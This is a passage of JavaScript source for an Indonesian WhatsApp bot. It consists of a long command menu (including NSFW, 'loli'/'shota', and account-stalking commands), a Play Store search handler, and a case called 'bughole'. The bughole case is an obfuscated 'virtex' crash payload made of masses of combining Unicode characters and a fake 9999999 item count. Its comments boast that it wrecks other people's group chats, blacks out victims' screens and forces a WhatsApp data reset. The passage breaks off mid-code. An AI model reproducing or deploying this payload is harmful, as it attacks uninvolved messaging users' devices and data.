*╠◪* ${prefix}crismes
*╠◪* ${prefix}bneon
*╠◪* ${prefix}matrix
*╠◪* ${prefix}breakwall
*╠◪* ${prefix}dropwater
*╠◪* ${prefix}leavest
*╠◪* ${prefix}darkjokes <FIX ERROR>
*╠◪* ${prefix}darklogo <NEW>
*╠◪* ${prefix}logobp
*╚═════════════════❀*
❏ *IMAGE EDIT MENU*
│
└◪› ${prefix}wanted
*╠◪* ${prefix}gtav
*╠◪* ${prefix}crossgun
*╠◪* ${prefix}bakar
*╠◪* ${prefix}facebookpage
*╠◪* ${prefix}costumwp
*╠◪* ${prefix}pantaimalam
*╠◪* ${prefix}pencil
*╚═════════════════❀*
❏ *FUN MENU*
│
└◪› ${prefix}gantengcek
*╠◪* ${prefix}cantikcek
*╠◪* ${prefix}sangecek
*╠◪* ${prefix}gaycek
*╠◪* ${prefix}lesbicek
*╠◪* ${prefix}watak
*╠◪* ${prefix}hobby
*╠◪* ${prefix}apakah
*╠◪* ${prefix}kapankah
*╠◪* ${prefix}bisakah
*╠◪* ${prefix}bagaimanakah
*╠◪* ${prefix}rate
*╠◪* ${prefix}alay
*╠◪* ${prefix}fml
*╠◪* ${prefix}tebakbendera
*╠◪* ${prefix}tebakgambar
*╠◪* ${prefix}randomnama
*╠◪* ${prefix}caklontong
*╠◪* ${prefix}family100
*╠◪* ${prefix}slot
*╠◪* ${prefix}suit
*╠◪* ${prefix}katacinta
*╠◪* ${prefix}pantun
*╠◪* ${prefix}hilih
*╠◪* ${prefix}holoh
*╠◪* ${prefix}halah
*╠◪* ${prefix}hurufterbalik
*╚═════════════════❀*
❏ *APK MENU*
│
└◪› ${prefix}apkpure
*╠◪* ${prefix}happymod
*╠◪* ${prefix}moddroid
*╚═════════════════❀* 
❏ *MEDIA MENU*
│
└◪› ${prefix}brainly 
*╠◪* ${prefix}stickerwa 
*╠◪* ${prefix}playstore
*╠◪* ${prefix}pinterest
*╠◪* ${prefix}wallpapersearch
*╠◪* ${prefix}wallpapersearch2
*╠◪* ${prefix}resepmasakan
*╠◪* ${prefix}igstalk
*╠◪* ${prefix}bitly
*╠◪* ${prefix}tkstalk 
*╠◪* ${prefix}twtstalk
*╠◪* ${prefix}ssweb
*╠◪* ${prefix}kbbi
*╠◪* ${prefix}meme
*╠◪* ${prefix}memeindo
*╠◪* ${prefix}githubstalk
*╚═════════════════❀* 
❏ *DOWNLOAD*
│
└◪› ${prefix}joox 
*╠◪* ${prefix}ytmp4 
*╠◪* ${prefix}ytmp3 
*╠◪* ${prefix}play
*╚═════════════════❀* 
❏ *ANIME MENU*
│
└◪› ${prefix}peluk
*╠◪* ${prefix}cium
*╠◪* ${prefix}husbu
*╠◪* ${prefix}ranime
*╠◪* ${prefix}waifu
*╠◪* ${prefix}animeboy
*╠◪* ${prefix}animegirl
*╠◪* ${prefix}animeimg
*╠◪* ${prefix}loli
*╠◪* ${prefix}shota
*╠◪* ${prefix}neko
*╠◪* ${prefix}animehug
*╠◪* ${prefix}animecry
*╚═════════════════❀*
╭══════❲ *FUNFUN MENU²*
*╠◪* *${prefix}gantengcek*
*╠◪* *${prefix}cantikcek*
*╠◪* *${prefix}jelekcek*
*╠◪* *${prefix}goblokcek*
*╠◪* *${prefix}begocek*
*╠◪* *${prefix}pintercek*
*╠◪* *${prefix}jagocek*
*╠◪* *${prefix}nolepcek*
*╠◪* *${prefix}babicek*
*╠◪* *${prefix}bebancek*
*╠◪* *${prefix}baikcek*
*╠◪* *${prefix}jahatcek*
*╠◪* *${prefix}anjingcek*
*╠◪* *${prefix}haramcek*
*╠◪* *${prefix}kontolcek*
*╠◪* *${prefix}pakboycek*
*╠◪* *${prefix}pakgirlcek*
*╠◪* *${prefix}sangecek*
*╠◪* *${prefix}bapercek*
╰═══════════════════⊷ 
❏ *NSFW MENU*
│
└◪› ${prefix}randomhentai 
*╠◪* ${prefix}randomsfw
*╠◪* ${prefix}randomnsfw
*╠◪* ${prefix}sfw
*╠◪* ${prefix}nsfw
*╠◪* ${prefix}nsfwneko 
*╚═════════════════❀*
❏ *RANDOM IMAGE*
│
└◪› ${prefix}aesthetic
*╠◪* ${prefix}fotocewek 
*╠◪* ${prefix}doraemon l
*╠◪* ${prefix}pokemon 
*╠◪* ${prefix}kucing 
*╠◪* ${prefix}hamster 
*╠◪* ${prefix}kelinci 
*╠◪* ${prefix}freefireimg 
*╠◪* ${prefix}ww2 
*╠◪* ${prefix}shota 
*╠◪* ${prefix}neko 
*╠◪* ${prefix}randomexo
*╠◪* ${prefix}randombts
*╠◪* ${prefix}imagegame
*╠◪* ${prefix}imagemountain
*╠◪* ${prefix}randomkpop
*╠◪* ${prefix}doraemon 
*╠◪* ${prefix}pokemon  
*╚═════════════════❀*
❏ *QUOTES MENU*
│
└◪› ${prefix}quotesanime
*╠◪* ${prefix}quotes
*╠◪* ${prefix}quotesimage
*╠◪* ${prefix}quoteskehidupan
*╠◪* ${prefix}fakta
*╠◪* ${prefix}katabijak
*╠◪* ${prefix}bacotanhacker
*╠◪* ${prefix}quotedoraemon
*╠◪* ${prefix}pantun
*╠◪* ${prefix}bucin
*╚═════════════════❀*
❏ *LIMIT & UANG*
│
└◪› ${prefix}limit
*╠◪* ${prefix}buylimit
*╠◪* ${prefix}buypremiumlimit
*╠◪* ${prefix}transfer
*╠◪* ${prefix}leaderboard
*╚═════════════════❀*
❏ *TOOLS*
│
└◪› ${prefix}bass
*╠◪* ${prefix}toimg
*╠◪* ${prefix}tomp3
*╠◪* ${prefix}slowmo
*╠◪* ${prefix}tempo
*╠◪* ${prefix}vibra
*╠◪* ${prefix}gemes
*╠◪* ${prefix}gemok
*╠◪* ${prefix}tupai
*╠◪* ${prefix}tinyurl
*╠◪* ${prefix}bitly
*╠◪* ${prefix}ocr
*╠◪* ${prefix}tts
*╠◪* ${prefix}kalkulator
*╚═════════════════❀*
❏ *AUDIO*
│
└◪› ${prefix}fast
*╠◪* ${prefix}tupai
*╠◪* ${prefix}gemuk
*╠◪* ${prefix}nightcore
*╠◪* ${prefix}slow
*╚═════════════════❀*
❏ *ISLAMIC*
└◪› ${prefix}asmaulhusna
*╠◪* ${prefix}kisahnabi
*╠◪* ${prefix}jadwalsholat
*╠◪* ${prefix}alquranaudio
*╚═════════════════❀*
╭══════❲ *MAKER²*════
*╠◪*  *${prefix}maker1*                   
*╠◪*  *${prefix}maker2*                   
*╠◪*  *${prefix}maker3*                   
*╠◪*  *${prefix}maker4*                   
*╠◪*  *${prefix}maker5*                   
*╠◪*  *${prefix}maker6*                   
*╠◪*  *${prefix}maker7*                   
*╠◪*  *${prefix}maker8*                   
*╠◪*  *${prefix}maker9*                   
*╠◪*  *${prefix}maker10*                   
*╠◪*  *${prefix}maker11*                   
*╠◪*  *${prefix}maker12*                   
*╠◪*  *${prefix}maker13*                   
*╠◪*  *${prefix}maker14*                   
*╠◪*  *${prefix}maker15*                   
*╠◪*  *${prefix}maker16*                   
*╠◪*  *${prefix}maker17*                   
*╠◪*  *${prefix}maker18*   
*╠◪*  *${prefix}maker19*                   
*╠◪*  *${prefix}maker20*         
*╠◪*  *${prefix}maker21*                   
*╠◪*  *${prefix}maker22*                   
*╠◪*  *${prefix}maker23*                   
*╠◪*  *${prefix}maker24*                   
*╠◪*  *${prefix}maker25*                   
*╠◪*  *${prefix}maker26*                   
*╠◪*  *${prefix}maker27*                   
*╠◪*  *${prefix}maker28*                   
*╠◪*  *${prefix}maker29*                   
*╠◪*  *${prefix}maker30*         
*╠◪*  *${prefix}maker31*                   
*╠◪*  *${prefix}maker32*                   
*╠◪*  *${prefix}maker33*                   
*╠◪*  *${prefix}maker34*                   
*╠◪*  *${prefix}maker35*                   
*╠◪*  *${prefix}maker36*                   
*╠◪*  *${prefix}maker37*                   
*╠◪*  *${prefix}maker38*                   
*╠◪*  *${prefix}maker39*                   
*╠◪*  *${prefix}maker40*         
*╠◪*  *${prefix}maker41*                   
*╠◪*  *${prefix}maker42*                   
*╠◪*  *${prefix}maker43*                   
*╠◪*  *${prefix}maker44*                   
*╠◪*  *${prefix}maker45*                   
*╠◪*  *${prefix}maker46*                   
*╠◪*  *${prefix}maker47*                   
*╠◪*  *${prefix}maker48*                   
*╠◪*  *${prefix}maker49*                   
*╠◪*  *${prefix}maker50*         
*╠◪*  *${prefix}maker51*                   
*╠◪*  *${prefix}maker52*                   
*╠◪*  *${prefix}maker53*                   
*╠◪*  *${prefix}maker54*                   
*╠◪*  *${prefix}maker55*                                     
*╠◪*  *${prefix}maker57*                   
*╠◪*  *${prefix}maker58*                   
*╠◪*  *${prefix}maker59*                   
*╠◪*  *${prefix}maker60*         
*╠◪*  *${prefix}maker61*                   
*╠◪*  *${prefix}maker62*                   
*╠◪*  *${prefix}maker63*                   
*╠◪*  *${prefix}maker64*                   
*╠◪*  *${prefix}maker65*                   
*╠◪*  *${prefix}maker66*                   
*╠◪*  *${prefix}maker67*                   
*╠◪*  *${prefix}maker68*                   
*╠◪*  *${prefix}maker69*                   
*╠◪*  *${prefix}maker70*         
*╠◪*  *${prefix}maker71*                   
*╠◪*  *${prefix}maker72*       
╰═══════════════
❏ *STORAGE*
│
└◪› ${prefix}addsticker
*╠◪* ${prefix}getsticker
*╠◪* ${prefix}stickerlist
*╠◪* ${prefix}addvideo
*╠◪* ${prefix}getvideo
*╠◪* ${prefix}videolist
*╠◪* ${prefix}getimage
*╠◪* ${prefix}addImage
*╠◪* ${prefix}imagelist
*╠◪* ${prefix}addaudio
*╠◪* ${prefix}getaudio
*╠◪* ${prefix}audiolist
*╚═════════════════❀*
❏ *NEW FITUR*
└◪› ${prefix}splaybutton
*╠◪* ${prefix}gplaybutton
*╠◪* ${prefix}togif
*╠◪* ${prefix}stickerwa
*╠◪* ${prefix}harta
*╠◪* ${prefix}harcos
*╠◪* ${prefix}twtstalk
*╠◪* ${prefix}bneon
*╠◪* ${prefix}matrix
*╠◪* ${prefix}breakwall
*╠◪* ${prefix}dropwater
*╠◪* ${prefix}leavest
*╠◪* ${prefix}logobp
*╠◪* ${prefix}quotesislami
*╠◪* ${prefix}qrencode
*╠◪* ${prefix}barcode
*╠◪* ${prefix}bacotanhacker
*╠◪* ${prefix}randomhentai
*╠◪* ${prefix}randomnsfw
*╠◪* ${prefix}nsfwneko
*╠◪* ${prefix}kataAnggan
*╠◪* ${prefix}katabucin
*╠◪* ${prefix}wame
*╠◪* ${prefix}imut
*╚═════════════════❀*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
*Special Thanx To ☄*
*➩Bang Angga: [ Ya Angga Lah:v ]*
*➩RECODE: [ Team ]*
*➩RECODE: [ Subscriberku ]*
*➩UPDATE: [ AnggaGanzz ]*
*➩Marcel*
*➩PENYEDIA APIKEY*
*➩SEMUA KREATOR BOT*
*➩Aqulz*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱


❏ *ABOUT BOT*
› Name : ${Angga.user.name}
› Browser : ${Angga.browserDescription[1]}
› Server : ${Angga.browserDescription[0]}
› Version : ${Angga.browserDescription[2]}
› Handphone : ${Angga.user.phone.device_manufacturer}
› Versi Whatsapp : ${Angga.user.phone.wa_version}
› User Register : ${_registered.length}


2. Spam call,Spam command = *BLOCK + BANNED*` 
try {
pp_user = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
pp_user = 'https://i.ibb.co/Gp4H47k/7dba54f7e250.jpg'
}
pp_riu = await getBuffer(pp_user)
                    Angga.sendMessage(from, pp_riu, image, {quoted: mek2, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [ow, num]}, displayname: mem, caption: menusu })
					break
					case 'playstore':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/playstore?apikey=${LoLKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
                    /****BUGHOLE •BUATAN ARIFI RAZZAQ OFFICIAL ****/
//asalusul-case: Gabungan Bug Pesan Sementara + bug troli total item + Dual Ephemeral + toggle Disappearing + Bantuan Virtex Thai 999999 •Semuanya Saya Gabungkan Dan Membuat Ganda Kontak Ephemeral
//buktinya: udah di coba dari berbagai team developer bot whatsapp/kecuali team haters atau team yang tidak di ketahui "bug ini lebih mematikan daripada bug troly" mohon gunakan dengan bijak!
//fungsi: bisa membuat attack gc atau merusak gc orang lain
//kegunaan: bisa membuat hitam layar hp pengguna dan mengakibatkan reset data Whatsapp!

case 'bughole':
if (!isOwner) return reply(ind.ownerb())
var _0x4e42=['݆݆ܻܻࣩ','*Myth','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋','ܻܻܻܺܺ','݆ܻܻࣩࣩ','๊๊์์์','֟֟֟֓֓','icXbo','hatsa','ٍٍٍٞ٘','᪴᪴᪴᪴Myt','֒֒֒֒֓','์์์๋๋','ؕؕؕؕؖ','Title','͊̈́̈́͋͋͋͋͋͋͋͠͠͠͠͠','ືືຶຶຶ','MOKAD','ّّّّؖ','͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠','̫̫̫̫̫̫̫̫̽̽̽̽̽̽̽','เึางื','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢','͢͢͠͠͠͠҉҉҉','৭99**','toggl','֓֓֒֒֒','ܑܑۛۛۛ','͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋','҈֟֟֟֟','itemC','ࣩࣩࣩࣧࣧ','ৣ͜͡҉*My','֒֒֒֘֘','֒֓֓֓֓','৭৭৭99','ดุท้่','̼̼̼̼̼̽̽̽̽̽̽̽͊͊͊','Hello','৭ঔৣ͜͡҉*','ຶຶຶຶຶ᪴᪴','ًًٍٍٍ','๊๊๊ࣤࣤ','҈҈̫̫̫̫̫̫̫̫̫̫̫','ؖؕؕؕؕ','๊๊๊์์','͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠','݆݊݊݊݊','̫̫̫̫̫̫̫̫̫̫̫̽̽̽̽','ܺܺܺܺܺ','֓֓֓֓֒','Messa','͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋','t҈҈҈҉','҈҈֟֟֟','͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠','͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́','͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠','݉݊݊݊݊','ࣩ࣯ࣩࣩࣩ','Xbot*','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','҈҈҈̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠','ssage','֓֓֓֒֒','݊݊݊݊݊','ຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','Xbot҈','ingMe','\x20Worl','ؕؕؖؖؖ','ࣨࣨࣨࣨࣤ','݆݆݊݊݊','9999*','֓֒֒֒֘','ؖؖؖؕؕ','ܺ݉݉݉݉','݉݉݉݊݊','৭৭99*','᪴᪴᪴᪴᪴᪴᪴My','֒֒֘֘֘','֗ؖؖؖؖ','๊ࣤࣤࣤࣤ','֟֓֓֓֓','bot*৭','֟֟֟֟֓','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ܑܑܑܑܑ','ٍٍٍٍٍ','Mythi','࣯ࣩࣩࣩࣩ','thicX','order','๋๋๋ືື','҈҈҈҉҉','ًًّٞٞ','݆݆݆݆݅','4829fwHcxj','13hXShDP','͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋','ot*৭৭','݉݉݉݉݊','҈҈҈҈̫̫̫̫̫','͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊','ًًًًً','1359289sKNbgc','݆݆݆݆ܻ','ًّٞٞٞ','t*৭ঔৣ͜͡','৭৭৭*M','์๋๋๋๋','̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋','bot҈҈','ot҈҈҈','**ঔৣ͜͡҉','๊๊๊๊๊','ّّؖؖؖ','ܑܑܑܑۛ','̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊','ܻܻܻܻܻ','hicXb','*ผิดุ','ࣩࣩࣩ࣯ࣩ','҉҉҉҉҉','҈҉҉҉҈','ࣩࣩࣩࣨࣨ','ppear','ًًًٍٍ','̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́','pp.ne','ࣨࣨࣤࣤࣤ','ࣩࣩࣩࣧࣧ','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','֘֘֘֗֗','essag','͢͢͠͠͠͠͠͠͠҉҉','ًٍٍٍۛ','างืผิ','ؖؖؖؖؖ','ܑܑܑܑܻ','҉҉҉҈҈','݆݆݆݆݅','ّّّؖؖ','݉݉݊݊݊','๊๊ࣤࣤࣤ','๊๊๊๊์','*৭৭৭ঔ','ًًًًّ','ٍٍٍٍ٘','҈҈҈҈҉','๋๋๋๋๋','ٍۛۛۛۛ','๒๒๒๒๒','֒֒֒֓֓','cXbot','ࣩࣨࣨࣨࣨ','ࣨࣨࣨࣤࣤ','๊์์์์','ܺܺܺ݉݉','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ًًٍٍٍ','֟֟֟֟֟','݆݆݆݊݊','͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠','ࣩࣩࣩࣩࣧ','*999*','ືືືຶຶ','৭৭৭ঔৣ͜͡','᪴Myth','ࣤࣤࣤࣤࣤ','ܑܑܑܻܻ','͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠','͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋','͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊','֘֗֗֗֗','ܻܻࣩࣩࣩ','ܻࣩࣩࣩࣩ','ࣩࣩࣩࣩࣨ','surfa','ًًًٍٍ','messa','ّٞٞٞٞ','҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫','ܑۛۛۛۛ','ܑܑܻܻܻ','๋๋๋๋ື','HOLE','ࣧࣧࣧࣧࣧ','owner','ًًًّٞ','ؕؕؕؖؖ','ٞٞٞٞ٘','҉҈҈҈҉','**999','͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋','0@s.w','݆݆݅݅݅','1cLVQaQ','ࣩࣩࣩࣩ࣯','ؕؖؖؖؖ','ືືືືຶ','͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊','ّّّّّ','ًًًًٍ','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','֓֓֓֓֓','ًًّّّ','̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽','͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́','eDisa','1200979orKwdx','֗֗֗֗ؖ','ືືືືື','݆݆݆݆݆','์์๋๋๋','ຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','҉*Myt','t*৭99','ؕؕؕؕؕ','͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','BLACK','๒๒๒*M','์์์์์','҈҉҉҉҉','͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋','99**ঔ','fRhVi','֓֒֒֒֒','ࣩࣩࣩࣩࣩ','݅݅݅݅݅','̫̫̽̽̽̽̽̽̽̽̽̽̽̽̽','݆݆݆݅݅','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','2EhGktQ','386031ZjTtDr','only','key','ຶຶຶຶຶ','ount','ࣩࣩࣨࣨࣨ','֒֒֓֓֓','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','ٍٍۛۛۛ','֒֘֘֘֘','ٞٞٞٞٞ','ࣩࣧࣧࣧࣧ','9**ঔৣ͜͡','֗֗ؖؖؖ','͢͢͠҉҉҉҉','๋๋ືືື','quote','҉҈҈֟֟','͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋','֟֟֓֓֓','ືຶຶຶຶ','݆݆݅݅݅','sendM','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠','҈҈҈҈҈','ࣩࣩࣧࣧࣧ','ٍٍٞٞ٘','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴M','log','statu','cipan','͢͢͠͠͠͠͠͠͠͠͠͠҉','͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊','์์์์๋','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴\x20','nvSjK','ࣩࣩ࣯ࣩࣩ','ࣩࣧࣧࣧࣧ','͋͢͢͢͢͢͢͢͢͢͠͠͠͠͠','191809UIvCgG','͋͋͋͋͋͋͋͢͢͢͠͠͠͠͠','֗֗֗ؖؖ','selle','֒֒֒֒֒','֘֘֗֗֗','ຶຶຶຶ᪴᪴᪴᪴᪴','҈҈҉҉҉','ythic','݆݆݆݅݅','̫̫̫̫̫̽̽̽̽̽̽̽̽̽̽','parti','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','ࣨࣨࣨࣨࣨ','҉҉҈҈֟','ࣩࣩࣩࣩࣧ','157OyWNpx','ঔৣ͜͡҉*M','͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́','ؖؖؕؕؕ','*ঔৣ͜͡҉*','ًّّّّ','3806qyahEk','҉҉҉҉҈','228596HWWiFX','ٍٞٞٞ٘','ܻܻܺܺܺ','ؖؖؖؖؕ','ܺܺ݉݉݉','ًًًًٍ','҈҈҈҈҈̫̫','ٍٍٍۛۛ','֘֘֘֘֗','ot*৭9','ۛۛۛۛۛ','ࣩࣩࣧࣧࣧ','*৭৭৭*','̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͠͠','๋ືືືື','๊๊๊๊ࣤ','͋͋͋͋͢͢͢͢͢͢͠͠͠͠͠','҉҈҈҈҈','ܻܻܻܻܺ','ّؖؖؖؖ','҉҉҈҈҈','ًٍٍٍٍ','̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽','rJid','֘֘֘֘֘','݆݆݆ܻܻ','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̽','݆݆݆݆݊','ܑܑܑۛۛ','ࣨࣤࣤࣤࣤ','ًًًًّ','̼̼̼̽̽̽͊͊͊͊͋͋͋͋͋','ຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴','৭৭৭৭৭','݆݅݅݅݅','ًًًّّ','t*৭৭৭','ท้่เึ','ܑܻܻܻܻ','ܺܺܺܺ݉','ܻܺܺܺܺ','֗֗֗֗֗','̼̼̼̼̼̽̽̽̽͊͊͊͊͋͋','݆݅݅݅݅','ঔৣ͜͡҉*\x20'];var _0x293d1a=function(_0xe5b85f,_0x3e47f9,_0x2b131c,_0x50b73d,_0xb8d2fd){return _0x9cdd(_0xe5b85f-0xf0,_0xb8d2fd);},_0x684e74=function(_0x25fd8a,_0x91e34f,_0x5898f3,_0x242999,_0x14a3c3){return _0x9cdd(_0x25fd8a-0xf0,_0x14a3c3);},_0x40c325=function(_0x3c464a,_0x8c809a,_0x5b0c60,_0x372cc8,_0x578bd0){return _0x9cdd(_0x3c464a-0xf0,_0x578bd0);},_0x28d701=function(_0x4eecc5,_0x3cab4b,_0xd619ab,_0x4cd0f1,_0x12a44a){return _0x9cdd(_0x4eecc5-0xf0,_0x12a44a);},_0x1dea33=function(_0x366fa0,_0x2f56d1,_0x6aa090,_0x49a4ac,_0x385e7d){return _0x9cdd(_0x366fa0-0xf0,_0x385e7d);};(function(_0x33730b,_0x32f0a8){var _0x163b34=function(_0x5f0177,_0x81cca3,_0x114d9e,_0x2eff52,_0x4fa4a2){return _0x9cdd(_0x2eff52- -0x204,_0x5f0177);},_0x32a1c2=function(_0x33946c,_0x2c302d,_0x1ad08d,_0x38ac3b,_0x3d59e1){return _0x9cdd(_0x38ac3b- -0x204,_0x33946c);},_0x4cd96d=function(_0x47e52a,_0x1402ed,_0x272342,_0x4905da,_0x14ba71){return _0x9cdd(_0x4905da- -0x204,_0x47e52a);},_0x43fde5=function(_0x12d949,_0xc6d9f5,_0x30ecb2,_0x418664,_0x43cb19){return _0x9cdd(_0x418664- -0x204,_0x12d949);},_0x5bee71=function(_0x5858b1,_0x3a3a7c,_0x23ba7d,_0x5eeccf,_0x39992f){return _0x9cdd(_0x5eeccf- -0x204,_0x5858b1);};while(!![]){try{var _0x39e2d9=parseInt(_0x163b34(0x25,-0x5f,-0xe3,-0x54,-0xf))+-parseInt(_0x32a1c2(0x9b,0x28,0x1c,0x46,0xa2))+parseInt(_0x4cd96d(-0x1,-0xd6,0x31,-0x5a,-0x13))*-parseInt(_0x43fde5(0xa7,-0x29,-0x52,0x3e,0xd9))+parseInt(_0x32a1c2(0x5d,0x151,0xa4,0xaf,0x34))*parseInt(_0x43fde5(0x55,0xd8,0xfb,0xa2,0x135))+-parseInt(_0x4cd96d(-0x28,0x1c,-0xf9,-0x91,-0x4b))+-parseInt(_0x32a1c2(-0xbd,-0xcb,-0xe4,-0x52,-0x99))*parseInt(_0x5bee71(-0x3a,-0xb,-0x6f,-0x92,-0x72))+-parseInt(_0x163b34(-0x19,0x2d,0x40,-0x6a,-0xfd))*-parseInt(_0x5bee71(-0x43,0x28,0x9b,0x3f,-0x5f));if(_0x39e2d9===_0x32f0a8)break;else _0x33730b['push'](_0x33730b['shift']());}catch(_0x40f4da){_0x33730b['push'](_0x33730b['shift']());}}}(_0x4e42,0x43a45+0x3be1*0x1a+-0x50c2*-0x3));if(!isOwner)return reply(mess[_0x293d1a(0x264,0x2c6,0x252,0x2e4,0x21b)][_0x293d1a(0x38d,0x429,0x3f9,0x2f3,0x31e)+'B']);setTimeout(()=>{var _0x3355c2=function(_0x43513e,_0x57f1de,_0x3e0b47,_0x460706,_0x342bf2){return _0x293d1a(_0x43513e-0x1ee,_0x57f1de-0x172,_0x3e0b47-0x6c,_0x460706-0xdc,_0x460706);},_0x56d461=function(_0x1867b5,_0x343438,_0x4289f5,_0x17c281,_0x5849d4){return _0x293d1a(_0x1867b5-0x1ee,_0x343438-0x1d0,_0x4289f5-0xed,_0x17c281-0xbd,_0x17c281);},_0x551ccd=function(_0x264413,_0x5305dd,_0x11cfee,_0x323213,_0xf60af2){return _0x684e74(_0x264413-0x1ee,_0x5305dd-0x8c,_0x11cfee-0x1b8,_0x323213-0x3e,_0x323213);},_0x506de4=function(_0x108789,_0x32b5a8,_0x2d0447,_0x1d98c5,_0x46e0b7){return _0x684e74(_0x108789-0x1ee,_0x32b5a8-0x1e9,_0x2d0447-0x42,_0x1d98c5-0xb4,_0x1d98c5);},_0x15fee0=function(_0x168d34,_0x2d9aee,_0xc2ee03,_0x2e815a,_0x306ed9){return _0x684e74(_0x168d34-0x1ee,_0x2d9aee-0xf3,_0xc2ee03-0xe8,_0x2e815a-0x6,_0x2e815a);},_0x289218={};_0x289218[_0x3355c2(0x449,0x42a,0x467,0x48f,0x4bb)]=_0x56d461(0x4ce,0x426,0x4fd,0x42b,0x4b8)+'D';var _0x7d80f1=_0x289218;Angga[_0x3355c2(0x4d6,0x50a,0x44d,0x441,0x57d)+_0x551ccd(0x590,0x4e4,0x4e9,0x611,0x52a)+_0x551ccd(0x53d,0x4b3,0x4e3,0x5c4,0x58e)+_0x3355c2(0x503,0x54e,0x582,0x477,0x524)+_0x506de4(0x4fe,0x46a,0x542,0x508,0x506)+'s'](from,_0x7d80f1[_0x15fee0(0x449,0x4e5,0x4d0,0x3ab,0x4ec)]);},-0x1*0x2a2+-0x1*0xcaa+0xf4e);var _0xe42396={};_0xe42396[_0x40c325(0x295,0x227,0x2f9,0x2f7,0x2c0)+_0x28d701(0x281,0x299,0x29c,0x258,0x248)+'t']=_0x28d701(0x394,0x3a7,0x30a,0x353,0x41e)+_0x40c325(0x2d7,0x2e6,0x314,0x2c6,0x36a)+_0x684e74(0x352,0x3ea,0x2bb,0x2da,0x30e)+'t';var _0x5ef334={};function _0x9cdd(_0x70a090,_0xec8581){_0x70a090=_0x70a090-(-0x48d*0x3+0x1bab+-0xca1);var _0x234669=_0x4e42[_0x70a090];return _0x234669;}_0x5ef334[_0x684e74(0x2ed,0x357,0x382,0x2bc,0x344)+_0x40c325(0x267,0x2c5,0x1e6,0x1ff,0x2d6)]=0x98967f,_0x5ef334[_0x293d1a(0x280,0x312,0x300,0x2b1,0x2a9)+'s']=0x1,_0x5ef334[_0x1dea33(0x383,0x385,0x3a4,0x37b,0x3dc)+'ce']=0x1,_0x5ef334[_0x28d701(0x385,0x3b8,0x3e8,0x2f6,0x319)+'ge']=_0x684e74(0x2ce,0x26c,0x2da,0x249,0x315)+_0x1dea33(0x32f,0x3c0,0x370,0x382,0x3c8)+_0x40c325(0x2b6,0x2d8,0x28d,0x32e,0x241)+_0x293d1a(0x291,0x22c,0x21b,0x263,0x239)+_0x293d1a(0x391,0x359,0x361,0x3bf,0x401)+_0x684e74(0x2b6,0x287,0x2c9,0x25e,0x354)+_0x28d701(0x35d,0x390,0x2c7,0x36e,0x3fc)+_0x28d701(0x291,0x294,0x273,0x2e8,0x2b4)+_0x684e74(0x34c,0x3f5,0x2e8,0x301,0x3e8)+_0x684e74(0x34c,0x3f3,0x2f6,0x2f1,0x2d0)+_0x684e74(0x34c,0x382,0x310,0x3d4,0x34e)+_0x28d